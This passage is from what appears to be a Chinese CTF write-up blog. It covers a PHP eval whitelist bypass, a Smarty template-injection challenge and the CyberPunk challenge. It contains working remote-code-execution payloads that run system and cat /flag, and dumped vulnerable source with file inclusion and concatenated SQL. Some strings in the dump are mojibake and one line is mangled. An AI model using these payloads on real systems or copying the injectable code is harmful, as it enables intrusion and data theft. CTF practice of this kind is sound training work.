class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
<h1 id="解题">解题</h1>
<p>需要先知道几个PHP的特性：</p>
<ul>
<li>动态函数。<code>$func='print_r';$func('hello');</code>，这句代码是能够输出hello的，那是因为<code>$func</code>被<code>print_r</code>代替，因此能够成功执行。</li>
<li>函数名为字符串。从上面的例子也可以看出函数名是字符串。</li>
</ul>
<p>先分析一下代码，首先设置了一个黑名单，然后再设置了一个白名单，也就是我们传入的参数<code>c</code>不能有黑名单的字符，又必须包含白名单的字符，而且长度不能超过80。这样子才能够最终执行到<code>eval('echo '.$content.';');</code>。</p>
<p>因此，本题考察的应该是RCE。我们<strong>需要将<code>$content</code>通过某种方式变为类似<code>system('ls')</code>命令</strong>。</p>
<h2 id="方法1">方法1</h2>
<p>先放出最开始的payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br></pre></td></tr></table></figure></p>
<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(784,10,36) -&gt; ls</span><br><span class="line">因此，等价于system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>也成功被执行：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410141715.png" /></p>
<p>但是，当执行有特殊符号的时候就不行了，比如<code>system('ls /')</code>，因为特殊符号不能直接用36进制表达，如果直接输入则因为不在白名单而无法通过。因此需要利用<code>hex2bin</code>将16进制的转为字符，但是16进制也无法过白名单（纯数字可以过，或者白名单内的函数名可以过），因此还需要将16进制转为10进制才可以。因此就由了如下payload：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))</span><br></pre></td></tr></table></figure></p>
<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(37907361743,10,36) -&gt; hex2bin</span><br><span class="line">dechex(1819484207) -&gt; 6c73202f(ls /的16进制表示)</span><br><span class="line">因此，等价于system(hex2bin(6c73202f)) -&gt; system(&#x27;ls /&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>但是，此时的长度已经超过80了。</p>
<hr />
<center>
小知识
</center>
<p>接下来就得想如何将长度缩减，忽然发现可以在url中这样传入数据：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?p=$cmd=id;system($_GET[cmd])</span><br></pre></td></tr></table></figure></p>
<p>这样子最终传入的<code>p</code>为<code>system(id)</code>。</p>
<hr />
<p>因此可以利用这种办法只在<code>c</code>参数传入必要的，剩下的都通过上述方式放到<code>c</code>中。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;ls /&#x27;)</span><br><span class="line">-&gt; ?c=($$pi)&#123;min&#125;(($$pi)&#123;max&#125;)</span><br><span class="line"></span><br><span class="line">其中$pi=base_convert(37907361743,10,36)(dechex(1598506324)) -&gt; _GET</span><br><span class="line">这样子($$pi)&#123;min&#125;(($$pi)&#123;max&#125;) -&gt; $_GET&#123;min&#125;($_GET&#123;max&#125;)</span><br><span class="line">其中，&#123;&#125;用于代替[]，即$_GET[min]($_GET[max])</span><br></pre></td></tr></table></figure></p>
<p>然后再传入<code>min=system</code>和<code>max=ls /</code>即可。最终payload如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;max&#125;)&amp;pi=system&amp;max=ls /</span><br><span class="line"></span><br><span class="line">如果使用min长度就会超，因此其中一个变量使用pi（这里$pi和pi是不一样的，前者是变量，后者就是一个参数名）</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144104.png" /></p>
<p>将<code>max=cat /flag</code>带入即可得到flag。</p>
<p>也可以直接执行，不过要找到比较短的命令（思路也是类似的）：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br><span class="line">($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line"></span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure></p>
<h2 id="方法2">方法2</h2>
<p>利用一个函数<code>getallheaders</code>，然后把命令通过HTTP头部传入。payload如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;cmd&#125;)</span><br></pre></td></tr></table></figure></p>
<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pi(696468,10,36) -&gt; exec</span><br><span class="line">$pi(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="line">因此，等价于exec(getallheaders()&#123;2&#125;)，就是获取HTTP头部信息中，字段为2的内容。</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144931.png" /></p>
<h2 id="方法3">方法3</h2>
<p>前两种方法都是利用将要传入的命令转为数字，然后通过函数再转换回对应的函数名，从而执行命令。但是其实白名单里面有许多的可用字符，用这些字符代替之前的数字，进行某种运算得到想要的函数名。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410150225.png" /></p>
<p>会发现 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_nan^64==&gt;_G</span><br><span class="line">tan^15==&gt;ET</span><br></pre></td></tr></table></figure></p>
<p>因此，最终的payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">总结</h1>
<p>这题考察的都是关于PHP的知识（我这不会PHP的太难了）</p>
<ul>
<li>各种编码转换绕过</li>
<li>URL中使用<code>$_GET</code>获取数据</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP知识</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019 华东南赛区 Web11</title>
    <url>/2022/04/16/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20Web11/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BCISCN2019%20华东南赛区%5DWeb11">Web11</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，看到了一堆信息：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121336.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121350.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121357.png" /></p>
<h1 id="解题">解题</h1>
<p>首先，我尝试了一下API
Usage，先后访问了<code>http://node4.buuoj.cn:29398/api</code>和<code>http://node4.buuoj.cn:29398/xff</code>，发现状态码都为301。</p>
<p>接着我尝试了一下Connection中的请求头，得到状态码500。</p>
<p>最后看到了<code>build with smarty</code>，可能暗示着存在SSTI，并且渲染引擎为smarty。首先尝试了一下<code>http://node4.buuoj.cn:29398/$&#123;7*7&#125;</code>，结果如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121736.png" /></p>
<p>这不应该呀，如果说确实渲染引擎确实为smarty的话，这里显示的应该是<code>$49</code>。思来想去，我注意到了url，我的输入居然变成了<code>$%7B7*7%7D</code>，那么自然不会被smarty给识别成代码执行。</p>
<p>所以，我尝试用burp发送请求。终于</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121940.png" /></p>
<p>确定了这里存在SSTI，那接下来就很简单了。可以先用<code>$&#123;smarty.version</code>查看一下版本，看一下能否利用一些标签。我这里直接使用命令执行，payload如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&quot;ls /&quot;)&#125; # 找到flag文件在根目录下</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122203.png" /></p>
<p>然后读取flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122245.png" /></p>
<h1 id="总结">总结</h1>
<p>这是一道关于SSTI的简单题目，唯一需要注意的点是不能直接在浏览器中输入payload，否则会被url编码，导致smarty不能识别。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>smarty</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web5 CyberPunk</title>
    <url>/2022/05/19/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%20CyberPunk/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%5DCyberPunk">CyberPunk</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境之后，</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519194227.png" /></p>
<p>查看页面源码</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519194245.png" /></p>
<p>可能存在文件包含，尝试直接包含文件，发现不行，故利用php伪协议读取：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>过滤了input，导致无法直接写入一句话。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// search.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || preg_match(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;å§å:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// change.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> (<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || preg_match(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;fetch_assoc();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>]<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        <span class="subst">$result</span> = <span class="subst">$db</span>-&gt;query(<span class="subst">$sql</span>);</span></span><br><span class="line"><span class="string">        if(!<span class="subst">$result</span>) &#123;</span></span><br><span class="line"><span class="string">            echo &#x27;error&#x27;;</span></span><br><span class="line"><span class="string">            print_r(<span class="subst">$db</span>-&gt;error);</span></span><br><span class="line"><span class="string">            exit;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        <span class="subst">$msg</span> = &quot;</span>è®¢åä¿®æ¹æå<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">        <span class="subst">$msg</span> = &quot;</span>æªæ¾å°è®¢å!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;else &#123;</span></span><br><span class="line"><span class="string">    <span class="subst">$msg</span> = &quot;</span>ä¿¡æ¯ä¸å¨<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// delete.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || preg_match(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;fetch_assoc();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;è®¢åå é¤æå&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dbname&quot;</span> =&gt;<span class="string">&quot;ctfusers&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// confirm.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span 